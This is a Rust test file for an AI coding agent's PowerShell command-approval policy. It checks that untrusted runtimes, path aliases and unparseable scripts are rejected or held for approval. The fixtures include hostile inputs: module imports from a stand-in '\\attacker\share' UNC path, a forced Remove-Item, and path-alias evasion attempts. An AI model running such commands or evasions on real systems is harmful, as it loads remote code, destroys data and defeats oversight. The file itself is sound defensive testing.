use super::*;
use codex_shell_command::powershell::PowerShellExecPolicyParse;
use codex_shell_command::powershell::PowerShellExecPolicyParseOutcome;

fn trusted_windows_powershell() -> String {
    codex_shell_command::powershell::try_find_powershell_executable_blocking()
        .expect("Windows PowerShell must be installed")
        .as_path()
        .to_str()
        .expect("the Windows PowerShell path must be valid UTF-8")
        .to_string()
}

fn powershell_command(script: &str) -> Vec<String> {
    vec![
        trusted_windows_powershell(),
        "-Command".to_string(),
        script.to_string(),
    ]
}

fn outer_result(command: &[String], prompt: bool) -> ExecApprovalRequirement {
    let amendment = Some(ExecPolicyAmendment::new(command.to_vec()));
    if prompt {
        ExecApprovalRequirement::NeedsApproval {
            reason: None,
            proposed_execpolicy_amendment: amendment,
        }
    } else {
        ExecApprovalRequirement::Skip {
            bypass_sandbox: false,
            proposed_execpolicy_amendment: amendment,
        }
    }
}

fn granular(rules: bool, sandbox_approval: bool) -> AskForApproval {
    AskForApproval::Granular(GranularApprovalConfig {
        rules,
        sandbox_approval,
        skill_approval: false,
        request_permissions: false,
        mcp_elicitations: false,
    })
}

fn approval_policies() -> [AskForApproval; 7] {
    [
        AskForApproval::Never,
        AskForApproval::OnRequest,
        AskForApproval::UnlessTrusted,
        granular(/*rules*/ false, /*sandbox_approval*/ false),
        granular(/*rules*/ false, /*sandbox_approval*/ true),
        granular(/*rules*/ true, /*sandbox_approval*/ false),
        granular(/*rules*/ true, /*sandbox_approval*/ true),
    ]
}

async fn requirement(
    policy_src: Option<&str>,
    command: &[String],
    approval_policy: AskForApproval,
    permission_profile: PermissionProfile,
    sandbox_permissions: SandboxPermissions,
) -> ExecApprovalRequirement {
    exec_approval_requirement_for_command(ExecApprovalRequirementScenario {
        policy_src: policy_src.map(str::to_owned),
        command: command.to_vec(),
        approval_policy,
        permission_profile,
        sandbox_permissions,
        prefix_rule: None,
    })
    .await
}

#[tokio::test]
async fn rejects_untrusted_powershell_across_approval_and_sandbox_modes() {
    let trusted = trusted_windows_powershell();
    let cases = [
        (
            "untrusted parsed runtime",
            vec_str(&["powershell.EXE.CmD", "-Command", "echo allowed"]),
            Some(r#"prefix_rule(pattern=["echo"], decision="allow")"#),
            "the PowerShell runtime is not a protected system executable",
        ),
        (
            "untrusted opaque body",
            vec_str(&[
                "powershell.exe",
                "-NonInteractive",
                "-Command",
                "echo blocked",
            ]),
            None,
            "an untrusted PowerShell wrapper could not be inspected with the protected system parser",
        ),
        (
            "full outer rule for bare runtime",
            vec_str(&["powershell.exe", "-Command", "echo allowed"]),
            Some(
                r#"prefix_rule(pattern=["powershell.exe", "-Command", "echo allowed"], decision="allow")"#,
            ),
            "the PowerShell runtime is not a protected system executable",
        ),
        (
            "verbatim path alias",
            vec![
                format!(r"\\?\{trusted}."),
                "-Command".to_string(),
                "echo allowed".to_string(),
            ],
            Some(r#"prefix_rule(pattern=["echo"], decision="allow")"#),
            "the PowerShell runtime is not a protected system executable",
        ),
        (
            "device path alias",
            vec![
                format!(r"\\.\{trusted} "),
                "-Command".to_string(),
                "echo allowed".to_string(),
            ],
            Some(r#"prefix_rule(pattern=["echo"], decision="allow")"#),
            "the PowerShell runtime is not a protected system executable",
        ),
    ];
    let policies = [
        AskForApproval::Never,
        AskForApproval::OnRequest,
        AskForApproval::UnlessTrusted,
        granular(/*rules*/ false, /*sandbox_approval*/ false),
        granular(/*rules*/ false, /*sandbox_approval*/ true),
        granular(/*rules*/ true, /*sandbox_approval*/ false),
        granular(/*rules*/ true, /*sandbox_approval*/ true),
    ];
    let profiles = [
        PermissionProfile::Disabled,
        PermissionProfile::read_only(),
        PermissionProfile::default(),
        PermissionProfile::External {
            network: NetworkSandboxPolicy::Restricted,
        },
    ];

    for (name, command, policy_src, reason) in cases {
        let rendered = render_shlex_command(&command);
        for approval_policy in policies {
            for permission_profile in &profiles {
                let requirement =
                    exec_approval_requirement_for_command(ExecApprovalRequirementScenario {
                        policy_src: policy_src.map(str::to_owned),
                        command: command.clone(),
                        approval_policy,
                        permission_profile: permission_profile.clone(),
                        sandbox_permissions: SandboxPermissions::UseDefault,
                        prefix_rule: None,
                    })
                    .await;

                pretty_assertions::assert_eq!(
                    requirement,
                    ExecApprovalRequirement::Forbidden {
                        reason: format!("`{rendered}` rejected: {reason}"),
                    },
                    "{} with {approval_policy:?} and {permission_profile:?}",
                    name
                );
            }
        }
    }
}

#[test]
fn parser_failures_are_terminal_for_trusted_and_untrusted_runtimes() {
    let command = powershell_command("Get-Content Cargo.toml");
    let rendered = render_shlex_command(&command);
    let cases = [
        (
            PowerShellExecPolicyParse::TrustedRuntime {
                outcome: PowerShellExecPolicyParseOutcome::Failed,
            },
            "the protected PowerShell parser failed",
        ),
        (
            PowerShellExecPolicyParse::UntrustedRuntime {
                outcome: PowerShellExecPolicyParseOutcome::Failed,
            },
            "the protected system parser failed while inspecting an untrusted PowerShell wrapper",
        ),
    ];

    for (parsed, reason) in cases {
        let Some(powershell_policy::PreparedPowerShell::Terminal(requirement)) =
            powershell_policy::prepare_classified(&command, parsed)
        else {
            panic!("parser failure must produce a terminal policy result");
        };
        pretty_assertions::assert_eq!(
            requirement,
            ExecApprovalRequirement::Forbidden {
                reason: format!("`{rendered}` rejected: {reason}"),
            },
        );
    }
}

#[tokio::test]
async fn trusted_unsupported_scripts_use_the_generic_outer_policy() {
    let scripts = [
        "",
        "param([string]$path) Get-Content Cargo.toml",
        "#Requires -Modules C:\\workspace\\CodexProbe.psm1\nGet-Content Cargo.toml",
        "UsInG MoDuLe '\\\\attacker\\share\\Evil.psd1'\nGet-Content Cargo.toml",
        "configuration CodexProbe { Import-DscResource -ModuleName '\\\\attacker\\share\\Evil.psd1' }",
        // The raw pre-parser gate intentionally accepts false positives in exchange for
        // never invoking SMA on a possible parse-time construct.
        "Write-Output 'confusing but inert'",
    ];
    let profiles = [PermissionProfile::Disabled, PermissionProfile::read_only()];

    for script in scripts {
        let command = powershell_command(script);
        for approval_policy in approval_policies() {
            for permission_profile in &profiles {
                let requirement = requirement(
                    None,
                    &command,
                    approval_policy,
                    permission_profile.clone(),
                    SandboxPermissions::UseDefault,
                )
                .await;
                let expected =
                    outer_result(&command, approval_policy == AskForApproval::UnlessTrusted);

                pretty_assertions::assert_eq!(
                    requirement,
                    expected,
                    "script {script:?} with {approval_policy:?} and {permission_profile:?}",
                );
            }
        }
    }
}

#[tokio::test]
async fn dangerous_trusted_unsupported_scripts_keep_generic_policy_protections() {
    let command = powershell_command("Write-Output 'using'; Remove-Item target -Force");
    let rendered = render_shlex_command(&command);
    let profiles = [PermissionProfile::Disabled, PermissionProfile::read_only()];

    for approval_policy in approval_policies() {
        for permission_profile in &profiles {
            let requirement = requirement(
                None,
                &command,
                approval_policy,
                permission_profile.clone(),
                SandboxPermissions::UseDefault,
            )
            .await;
            let expected = match approval_policy {
                AskForApproval::Never
                    if matches!(permission_profile, PermissionProfile::Disabled) =>
                {
                    outer_result(&command, false)
                }
                AskForApproval::Never => ExecApprovalRequirement::Forbidden {
                    reason: format!("`{rendered}` rejected: blocked by policy"),
                },
                AskForApproval::Granular(config) if !config.allows_sandbox_approval() => {
                    ExecApprovalRequirement::Forbidden {
                        reason: REJECT_SANDBOX_APPROVAL_REASON.to_string(),
                    }
                }
                _ => outer_result(&command, true),
            };

            pretty_assertions::assert_eq!(
                requirement,
                expected,
                "{approval_policy:?} with {permission_profile:?}",
            );
        }
    }
}

#[tokio::test]
async fn sandbox_override_on_trusted_unsupported_script_uses_outer_argv() {
    let command = powershell_command("Write-Output 'confusing but inert'");

    for (approval_policy, permits_prompt) in [
        (AskForApproval::OnRequest, true),
        (granular(/*rules*/ true, /*sandbox_approval*/ true), true),
        (granular(/*rules*/ true, /*sandbox_approval*/ false), false),
    ] {
        pretty_assertions::assert_eq!(
            requirement(
                None,
                &command,
                approval_policy,
                PermissionProfile::read_only(),
                SandboxPermissions::RequireEscalated,
            )
            .await,
            if permits_prompt {
                outer_result(&command, true)
            } else {
                ExecApprovalRequirement::Forbidden {
                    reason: REJECT_SANDBOX_APPROVAL_REASON.to_string(),
                }
            },
        );
    }
}

#[tokio::test]
async fn trusted_unsupported_scripts_only_match_outer_rules() {
    let inner_rule_command = powershell_command(
        "#Requires -Modules C:\\workspace\\CodexProbe.psm1\nGet-Content Cargo.toml",
    );

    pretty_assertions::assert_eq!(
        requirement(
            Some(r#"prefix_rule(pattern=["Get-Content"], decision="allow")"#),
            &inner_rule_command,
            AskForApproval::UnlessTrusted,
            PermissionProfile::read_only(),
            SandboxPermissions::UseDefault,
        )
        .await,
        outer_result(&inner_rule_command, true),
    );

    let command = powershell_command("Write-Output 'confusing but inert'");
    let outer_pattern = command
        .iter()
        .map(|word| format!(r#""{}""#, starlark_string(word)))
        .collect::<Vec<_>>()
        .join(", ");
    let policy_src = format!(r#"prefix_rule(pattern=[{outer_pattern}], decision="allow")"#);
    pretty_assertions::assert_eq!(
        requirement(
            Some(&policy_src),
            &command,
            AskForApproval::UnlessTrusted,
            PermissionProfile::read_only(),
            SandboxPermissions::UseDefault,
        )
        .await,
        ExecApprovalRequirement::Skip {
            bypass_sandbox: true,
            proposed_execpolicy_amendment: None,
        },
    );
}
